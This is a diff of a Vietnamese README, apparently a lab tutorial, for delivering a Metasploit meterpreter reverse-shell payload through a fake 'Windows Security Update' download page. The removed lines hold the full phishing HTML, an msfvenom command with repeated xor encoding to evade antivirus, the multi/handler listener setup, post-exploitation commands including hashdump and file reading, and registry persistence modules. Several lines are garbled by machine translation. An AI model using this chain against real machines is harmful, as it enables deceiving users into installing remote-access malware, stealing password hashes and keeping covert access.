@@ -53,51 +53,20 @@ Bước 1 — Khởi động Apache & tạo web thư mục
 
 <img width="448" height="222" alt="image" src="https://github.com/user-attachments/assets/951324e4-5852-45eb-a15e-58aea3113ae3" />
 
-sudo systemctl start apache2
-sudo systemctl enable apache2
 
-sudo mkdir -p /var/www/html/fb
-sudo chmod -R 777 /var/www/html/fb
-sudo fuser -k 4567/tcp
 Kiểm tra quá trình chạy Apache (phải được tìm thấy Active: active (running)):
 
-đậpsudo systemctl status apache2
+<img width="399" height="55" alt="image" src="https://github.com/user-attachments/assets/54ba0ed6-327b-4e77-96f8-56a7efcb7f5c" />
 
 Bước 2 — Tạo trang lừa đảo (download.html)
 
 Sử teedụng thay thế nanođể tránh lỗi trong một số trường môi trường:
+<img width="1353" height="716" alt="image" src="https://github.com/user-attachments/assets/db505f35-9a4a-47d1-9d57-dbbe2d09017f" />
 
-đập# Terminal 2
-sudo tee /var/www/html/fb/download.html << 'EOF'
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="utf-8">
-    <title>Windows Security Update</title>
-    <style>
-        body{font-family:Arial;background:#0f0f0f;color:white;text-align:center;padding:50px}
-        .box{max-width:600px;margin:auto;background:#1f1f1f;padding:40px;border-radius:12px;box-shadow:0 0 15px #0078d4}
-        button{padding:18px 50px;font-size:20px;background:#0078d4;color:white;border:none;border-radius:8px;cursor:pointer}
-        button:hover{background:#106ebe}
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1>Windows Update</h1>
-        <p><strong>Cap nhat bao mat khan cap</strong></p>
-        <p>He thong phat hien lo hong bao mat. Vui long tai va cai dat ngay.</p>
-        <a href="setup_windows_update.exe" download>
-            <button>TAI VA CAI DAT NGAY</button>
-        </a>
-        <p style="margin-top:25px;color:#aaa">File: setup_windows_update.exe</p>
-    </div>
-</body>
-</html>
-EOF
 
 Kiểm tra tệp đã tạo:
 
-đậpls -lh /var/www/html/fb/
+ls -lh /var/www/html/fb/
 
 Bước 3 — Tạo payload với msfvenom (được mã hóa)
 
@@ -106,27 +75,17 @@ Bước 3 — Tạo payload với msfvenom (được mã hóa)
 
 
 
-Payload cũ (bị AV detect)Payload mới (định nghĩa hơn)Tên tải trọngmeterpreter_reverse_tcpmeterpreter/reverse_tcpLoạiKhông có sân khấu (~7MB)Staged (nhỏ hơn)Mã hóaKhông mã hóaMã hóa 5 lần ( x64/xor_dynamic)năng lượng bị AV phát hiệnCaogiao hàng
-
-
 ⚠️ Thay đổi 192.168.80.135việc thực thi IP của Kali (kiểm tra bằng ip a).
 
 
 
-đập# Terminal 2 — chú ý dấu "/" thay vì "_" trong tên payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=192.168.80.135 LPORT=4567 \
-  -e x64/xor_dynamic -i 5 \
-  -f exe \
-  --platform windows \
-  -a x64 \
-  -o ~/setup_windows_update.exe
+<img width="725" height="254" alt="image" src="https://github.com/user-attachments/assets/480f465a-476b-4133-a256-798f2d714db9" />
+
 
 Sao chép tải trọng vào web thư mục:
 
-đậpsudo cp ~/setup_windows_update.exe /var/www/html/fb/setup_windows_update.exe
-sudo chmod 777 /var/www/html/fb/setup_windows_update.exe
-ls -lh /var/www/html/fb/
+<img width="813" height="117" alt="image" src="https://github.com/user-attachments/assets/28c1ee69-8633-4d86-bc89-b711b4634e4c" />
+
 
 
 ✅ Tệp .exephải có khoảng kích thước 200–400KB . Nếu thấy ~7MB đang sử dụng cũ tải trọng (cấu hình sai).
@@ -140,18 +99,12 @@ Bước 4 — Khởi động Listener (Metasploit) với AutoMigrate
 
 
 
-đập# Terminal 1
-msfconsole -q
+<img width="224" height="75" alt="image" src="https://github.com/user-attachments/assets/caf2021a-a886-4cc8-ad0f-c669c3e4ba4b" />
+
 
 Trong msfconsole, gõ từng dòng:
+<img width="612" height="204" alt="image" src="https://github.com/user-attachments/assets/b5610a3d-27a5-4f00-8458-3261922ef47e" />
 
-use multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.80.135
-set LPORT 4567
-set AutoRunScript post/windows/manage/migrate
-set ExitOnSession false
-exploit -j
 
 Phải thấy dòng:
 
@@ -189,52 +142,17 @@ Chuột phải vào file → Chạy với tư cách quản trị viên
 
 Bước 6 — Kiểm tra phiên
 
-# Trong msfconsole
-sessions
+<img width="825" height="332" alt="image" src="https://github.com/user-attachments/assets/1af60e2a-cce1-428c-a4e5-bcfb524056d0" />
 
-Kết quả mong đợi:
-
-Nhận dạngTênKiểuThông tinSự liên quan1meterpreter x64/windowsDESKTOP-XXX\user192.168.80.135 → 192.168.80.X
-
-Vào buổi tập và thao tác:
-
-sessions -i 1
-
-đập# Các lệnh demo cơ bản trong meterpreter
-sysinfo
-getuid
-getpid
-ps
-pwd
-ls
+<img width="807" height="349" alt="image" src="https://github.com/user-attachments/assets/b1a80998-f1a1-412a-ac41-0aba390fa41e" />
 
 
 🧩 Hậu khai thác (Sau khai thác)
 
-Lệnhnăng lượngsysinfoXem nhân hệ thống thông tingetuid/getpidXem quyền người dùng & hiện tại PIDpsList List đang chạyscreenshotChụp màn hình máy nhândownload/uploadTải file qua lại giữa 2 máyhashdumpTrích xuất hàm băm mật khẩu (hash)search -f <tên_file>Tìm file trên máy nhân
+<img width="761" height="435" alt="image" src="https://github.com/user-attachments/assets/cca0ed14-3b25-44a3-a35a-b1bb23f54063" />
 
 Ví dụ tìm và đọc file:
 
-đậpsearch -f 123.txt
-ls C:\\Users\\Administrator\\Desktop
-cat C:\\Users\\Administrator\\Desktop\\123.txt
-
-Persistence — Duy trì kết nối sau khi khởi động lại
+<img width="535" height="110" alt="image" src="https://github.com/user-attachments/assets/62865649-2998-4f5b-bb3c-ab2cd1070791" />
 
 
-Persistence giúp duy trì kết nối sau khi nạn nhân khởi động lại — thường được đề cập trong phần tấn công phân tích của báo cáo.
-
-
-
-Cách 1 — Module persistence_exe(chạy trong phiên Meterpreter):
-
-run post/windows/manage/persistence_exe STARTUP=REGISTRY SESSION=1
-
-Cách 2 — Mô-đun persistence(phiên nền trước):
-
-background
-use post/multi/manage/shell_to_meterpreter
-use exploit/windows/local/persistence
-set SESSION 1
-set STARTUP REGISTRY
-run
